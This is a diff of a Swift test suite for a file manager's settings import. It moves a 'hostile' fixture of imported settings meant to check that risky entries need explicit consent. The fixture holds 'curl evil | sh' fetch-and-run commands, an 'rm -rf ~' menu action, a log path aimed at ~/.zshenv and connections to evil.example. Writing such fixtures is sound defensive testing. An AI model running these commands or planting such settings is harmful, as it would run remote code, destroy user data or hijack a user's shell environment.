@@ -15,6 +15,20 @@ import Testing
 @MainActor
 @Suite
 internal struct Review2ConfigASettings {
+    internal static let hostile = """
+        "demo.flag": true, "demo.text": "hello",
+        "configuration.userCommands": [{"name":"em_x","title":"X","action":{"command":"curl evil | sh","parameters":"%P"}}],
+        "configuration.startMenu": [{"title":"Documents","action":{"command":"rm -rf ~"}}],
+        "keyBindings": {"em_x": ["return"]},
+        "macIntegration.editor": "/tmp/evil.app",
+        "fileOperations.log.file": "/Users/me/.zshenv",
+        "network.trustedCertificates": {"bank.example": ["AA:BB"]},
+        "network.connections": [{"id":"11111111-2222-3333-4444-555555555555","name":"n","host":"evil.example","user":"u"}],
+        "places.hotlist": {"entries":[{"title":"Documents","command":"afm_RunCommandLine curl evil | sh"}]},
+        "left.tabs": {"active":0,"tabs":[{"location":"sftp://evil.example/x","sortKey":0,"descending":false,"showHidden":false}]},
+        "nobody.knows": 1, "": 2, "places.hotlist.unreadable.x": 3
+        """
+
     internal let box: Sandbox
     internal let settings = MemorySettings()
     internal let plugin: ConfigurationPlugin
@@ -66,20 +80,6 @@ internal struct Review2ConfigASettings {
     internal func stored(_ key: String) -> String? {
         settings.data(forKey: key).map { String(decoding: $0, as: UTF8.self) }
     }
-
-    internal static let hostile = """
-        "demo.flag": true, "demo.text": "hello",
-        "configuration.userCommands": [{"name":"em_x","title":"X","action":{"command":"curl evil | sh","parameters":"%P"}}],
-        "configuration.startMenu": [{"title":"Documents","action":{"command":"rm -rf ~"}}],
-        "keyBindings": {"em_x": ["return"]},
-        "macIntegration.editor": "/tmp/evil.app",
-        "fileOperations.log.file": "/Users/me/.zshenv",
-        "network.trustedCertificates": {"bank.example": ["AA:BB"]},
-        "network.connections": [{"id":"11111111-2222-3333-4444-555555555555","name":"n","host":"evil.example","user":"u"}],
-        "places.hotlist": {"entries":[{"title":"Documents","command":"afm_RunCommandLine curl evil | sh"}]},
-        "left.tabs": {"active":0,"tabs":[{"location":"sftp://evil.example/x","sortKey":0,"descending":false,"showHidden":false}]},
-        "nobody.knows": 1, "": 2, "places.hotlist.unreadable.x": 3
-        """
 
     @Test
     internal func nothingIsImportedWithoutAnAnswerAndTheRiskyPartsOnlyWhenTicked() throws {
